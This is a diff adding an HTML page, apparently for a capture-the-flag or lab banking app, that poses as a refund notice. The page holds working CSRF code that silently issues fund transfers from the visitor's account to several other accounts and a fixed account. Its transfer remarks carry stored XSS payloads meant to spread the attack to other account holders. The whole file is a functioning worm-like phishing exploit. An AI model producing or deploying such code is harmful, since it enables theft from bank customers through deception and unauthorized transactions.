@@ -1,0 +1,45 @@
+<html>
+<body >
+We are very sorry for the inconvenience, you had an error while during the last transaction, please click the button bellow to claim your refund plus 1 cent gift.
+<button onclick="getURL()"> Proceed </button>
+<div style="display:none" id="images"> </div>
+</body>
+
+<script>
+const queryString = window.location.search;
+console.log(queryString);
+const urlParams = new URLSearchParams(queryString);
+const accountNo = urlParams.get('x');
+console.log(accountNo);
+
+const allAccounts = [11111111,22222222,33333333,44444444,55555555,66666666,77777777,88888888,99999999];
+
+function getURL()
+{
+
+allAccounts.forEach(function(destAccount){
+	if(destAccount!= accountNo){
+		var varName = new Image();
+		varName.src = "http://localhost/htdocs/index.php?page=htbtransfer&srcacc="+accountNo+"&dstbank=41131337&dstacc="+destAccount+"&amount=1.1&remark=%3Cscript%3Evar+x+%3D+document.getElementsByName%28%22account%22%29%5B0%5D.value%3C%2Fscript%3E&htbtransfer=Transfer";
+		document.getElementById('images').appendChild(varName);
+		
+		var funcName = new Image();
+		funcName.src = "http://localhost/htdocs/index.php?page=htbtransfer&srcacc="+accountNo+"&dstbank=41131337&dstacc="+destAccount+"&amount=1.2&remark=%3Cscript%3Efunction+y%28%29%7Bwindow.open%28%22http%3A%2F%2Flocalhost%2Fhtdocs%2Ferror.html%3Fx%3D%22%2Bx%2C+%22_blank%22%29%3B%7D%3C%2Fscript%3E&htbtransfer=Transfer";
+		document.getElementById('images').appendChild(funcName);
+		
+		var executeFunction = new Image();
+		executeFunction.src = "http://localhost/htdocs/index.php?page=htbtransfer&srcacc="+accountNo+"&dstbank=41131337&dstacc="+destAccount+"&amount=1.3&remark=%3Ca+onclick%3D%22y%28%29%22%3EError+please+click+here%21%21%3C%2Fa%3E++&htbtransfer=Transfer";
+		document.getElementById('images').appendChild(executeFunction);
+
+	}	
+	});
+
+const url = "http://localhost/htdocs/index.php?page=htbtransfer&srcacc="+accountNo+"&dstbank=41131337&dstacc=14314312&amount=1.95&remark=&htbtransfer=Transfer";
+
+window.open(url, "_blank");
+
+}
+
+</script>
+
+</html>
